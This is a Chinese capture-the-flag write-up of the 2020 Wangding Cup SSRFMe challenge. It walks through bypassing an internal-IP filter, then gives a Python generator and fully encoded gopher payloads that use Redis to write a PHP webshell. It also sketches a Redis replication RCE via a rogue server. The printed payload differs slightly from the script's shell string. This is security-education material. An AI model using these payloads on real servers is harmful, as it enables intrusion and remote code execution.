# \[网鼎杯 2020 玄武组]SSRFMe

## \[网鼎杯 2020 玄武组]SSRFMe

## 考点



## wp

打开靶机给了源码

第一个函数`check_inner_ip`，传入的URL必须以`http https gopher dict`开头，然后用parse\_url解析获取hostname

`gethostbyname()`函数用于获取hostname对应的IPv4地址，失败则返回hostname

`ip2long()`函数用于把IPv4地址转换为长整数

传入的URL对应的IP格式必须是`127.*   10.*  172.16.*  192.168.*`

否则返回False

```php
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
    $hostname=$url_parse['host'];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
}
```

第二个函数`safe_request_url`，传入的url如果符合`check_inner_ip`函数的要求，就直接输出url

如果传入的不是私有地址，就使用PHP curl获取页面。如果私有地址中间有302跳转，就把跳转的目标url再用`safe_request_url`函数访问，这样就避免了用302跳转绕过本地限制

```php
function safe_request_url($url)
{

    if (check_inner_ip($url))
    {
        echo $url.' is inner ip';
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
        curl_close($ch);
        var_dump($output);
    }

}
```

最后一段，提示先访问本地的`hint.php`

```php
if(isset($_GET['url'])){
    $url = $_GET['url'];
    if(!empty($url)){
        safe_request_url($url);
    }
} 
// Please visit hint.php locally. 
```

这些操作相当于限制本地访问，同时要求访问本地`hint.php`

常用策略就是八进制 十六进制 全0 等方法

```
http://0.0.0.0/hint.php    只能Linux下用
http://[0:0:0:0:0:ffff:127.0.0.1]/hint.php
```

得到新代码，向POST传入的file参数写入`"<?php echo 'redispass is root';exit();".$_POST['file']`

```php
<?php
if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
  highlight_file(__FILE__);
}
if(isset($_POST['file'])){
  file_put_contents($_POST['file'],"<?php echo 'redispass is root';exit();".$_POST['file']);
}
```

这里给了提示redis密码为`root`

用下面脚本生成payload

<pre class="language-python"><code class="lang-python"><strong>from urllib.parse import quote
</strong>
protocol="gopher://"
ip="0.0.0.0"
port="6379"
shell="&#x3C;?php system('cat /flag');?>"
filename="b.php"
path="/var/www/html"
passwd="root"
cmd=["auth root",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
payload=''
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd
def generate_payload():
    global payload
    for x in cmd:
        payload += quote(redis_format(x))
    return payload

print(generate_payload())
</code></pre>

payload

{% code overflow="wrap" %}
```
gopher://0.0.0.0:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%244%0D%0Aroot%0D%0A%2A2%0D%0A%244%0D%0Aauth%0D%0A%244%0D%0Aroot%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2436%0D%0A%3C%3Fphp%20var_dump%28readfile%28%27/flag%27%29%29%3B%3F%3E%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%245%0D%0Ab.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```
{% endcode %}

再URL编码一下

{% code overflow="wrap" %}
```
gopher://0.0.0.0:6379/_%252a2%250d%250a%25244%250d%250aauth%250d%250a%25244%250d%250aroot%250d%250a%252a2%250d%250a%25244%250d%250aauth%250d%250a%25244%250d%250aroot%250d%250a%252a3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250a1%250d%250a%252436%250d%250a%253c%253fphp%2520var_dump%2528readfile%2528%2527%2fflag%2527%2529%2529%253b%253f%253e%250d%250a%252a4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250adir%250d%250a%252413%250d%250a%2fvar%2fwww%2fhtml%250d%250a%252a4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%252410%250d%250adbfilename%250d%250a%25245%250d%250ab.php%250d%250a%252a1%250d%250a%25244%250d%250asave%250d%250a
```
{% endcode %}

在靶机直接打?url=payload，然后访问b.php即可

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

预期解法是redis主从复制rce BUU环境有问题复现不了

下载[redis-ssrf](https://github.com/xmsec/redis-ssrf)，修改[ssrf-redis.py](https://github.com/xmsec/redis-ssrf/blob/master/ssrf-redis.py)

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

下载[redis-rogue-server](https://github.com/Dliv3/redis-rogue-server) &#x20;

把exp.so ssrf-redis.py rogue-server.py上传到VPS

运行ssrf-redis.py得到payload

再运行rogue-server.py

把payload再URL编码一下，在靶机用编码后的payload打过去





## 小结

1. [\[网鼎杯 2020 玄武组\]SSRFMe](https://liotree.github.io/2020/07/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/)1
2. [\[网鼎杯 2020 玄武组\]SSRFMe](https://www.cnblogs.com/karsa/p/14123995.htm)2
3. 感谢我[Boogipop](https://boogipop.com/)

